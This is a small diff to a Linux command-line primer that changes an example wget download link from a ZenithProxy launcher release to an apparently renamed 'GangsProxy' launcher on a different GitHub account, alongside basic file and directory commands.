@@ -24,7 +24,7 @@ For example, Ubuntu uses the `apt` package manager
 * Ctrl-c keys to close the current application
 * `mv <file> <destination>` move a file to a destination directory
 * `mkdir <dir name>` create a directory
-* `wget https://github.com/rfresh2/ZenithProxy/releases/download/launcher-v3/ZenithProxy-launcher-linux-amd64.zip` Download a file from the internet
+* `wget https://github.com/Evitxu14/GangsProxy/releases/download/launcher-v3/GangsProxy-launcher-linux-amd64.zip` Download a file from the internet
 * `cp <file> <destination>` copy a file to a destination file
 
 
